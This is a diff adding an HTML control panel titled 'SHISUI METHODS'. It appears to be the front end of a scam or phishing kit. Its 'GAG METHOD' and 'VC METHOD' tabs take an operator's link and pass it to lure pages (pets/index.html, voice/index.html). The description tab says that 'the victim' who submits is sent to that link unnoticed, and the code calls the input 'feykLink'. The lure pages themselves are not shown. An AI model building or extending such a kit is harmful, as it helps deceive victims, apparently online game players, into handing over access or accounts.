@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>SHISUI METHODS</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #121212;
+      color: #00ffcc;
+      padding: 40px 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    h1 {
+      margin-bottom: 30px;
+    }
+    /* Tabs container */
+    .tabs {
+      width: 360px;
+      background: #222;
+      border-radius: 8px;
+      box-shadow: 0 0 15px #00ffcc;
+    }
+    /* Tab buttons */
+    .tab-buttons {
+      display: flex;
+      border-bottom: 2px solid #00ffcc;
+    }
+    .tab-buttons button {
+      flex: 1;
+      padding: 12px 0;
+      background: transparent;
+      border: none;
+      color: #00ffcc;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      font-size: 16px;
+    }
+    .tab-buttons button:hover {
+      background: #00ffcc33;
+    }
+    .tab-buttons button.active {
+      background: #00ffcc;
+      color: #000;
+      border-radius: 8px 8px 0 0;
+      font-weight: 900;
+    }
+    /* Tab content */
+    .tab-content {
+      padding: 20px 25px;
+      background: #111;
+      border-radius: 0 0 8px 8px;
+      min-height: 140px;
+      color: #00ffcc;
+    }
+    /* Forms */
+    form {
+      display: flex;
+      gap: 10px;
+    }
+    input[type="text"] {
+      flex-grow: 1;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      color: #000;
+    }
+    input[type="submit"] {
+      background: #00ffcc;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 15px;
+      font-weight: bold;
+      cursor: pointer;
+      color: #000;
+      transition: background 0.3s ease;
+    }
+    input[type="submit"]:hover {
+      background: #00d9b1;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>SHISUI METHODS</h1>
+
+  <div class="tabs">
+    <div class="tab-buttons">
+      <button class="tab-btn active" data-tab="gag">GAG METHOD</button>
+      <button class="tab-btn" data-tab="vc">VC METHOD</button>
+      <button class="tab-btn" data-tab="desc">DESCRIPTION</button>
+    </div>
+
+    <div id="gag" class="tab-content" style="display: block;">
+      <form id="gagForm">
+        <input type="text" id="gagLink" placeholder="PRIVATE SERVER LINK" required />
+        <input type="submit" value="Submit" />
+      </form>
+    </div>
+
+    <div id="vc" class="tab-content" style="display: none;">
+      <form id="vcForm">
+        <input type="text" id="vcLink" placeholder="GROUP LINK NAME VOICE CHAT GETTER" required />
+        <input type="submit" value="Submit" />
+      </form>
+    </div>
+
+    <div id="desc" class="tab-content" style="display: none;">
+      <p>
+        THIS IS METHOD LIKE IF U PUT OUR LINK AND THE VICTIM SUBMIT WILL GO TO LINK U PUT (DI MAHAHALATA).<br><br>
+        STAY TUNED FOR MORE METHOD LIKE THIS AND SUGGEST IN SUGGESTIONS CHANNEL.<br><br>
+        THANK YOU FOR SUPPORTING!
+      </p>
+    </div>
+  </div>
+
+  <script>
+    // Tab switching logic
+    const tabs = document.querySelectorAll('.tab-btn');
+    const contents = document.querySelectorAll('.tab-content');
+
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => {
+        // Remove active class on buttons
+        tabs.forEach(btn => btn.classList.remove('active'));
+        // Hide all content
+        contents.forEach(c => c.style.display = 'none');
+
+        // Activate current tab button
+        tab.classList.add('active');
+        // Show corresponding content
+        document.getElementById(tab.dataset.tab).style.display = 'block';
+      });
+    });
+
+    // GAG METHOD form submit
+    document.getElementById('gagForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const feykLink = document.getElementById('gagLink').value.trim();
+      if (feykLink) {
+        const encodedLink = encodeURIComponent(feykLink);
+        window.location.href = `pets/index.html?link=${encodedLink}`;
+      }
+    });
+
+    // VC METHOD form submit
+    document.getElementById('vcForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const feykLink = document.getElementById('vcLink').value.trim();
+      if (feykLink) {
+        const encodedLink = encodeURIComponent(feykLink);
+        window.location.href = `voice/index.html?link=${encodedLink}`;
+      }
+    });
+  </script>
+
+</body>
+</html>
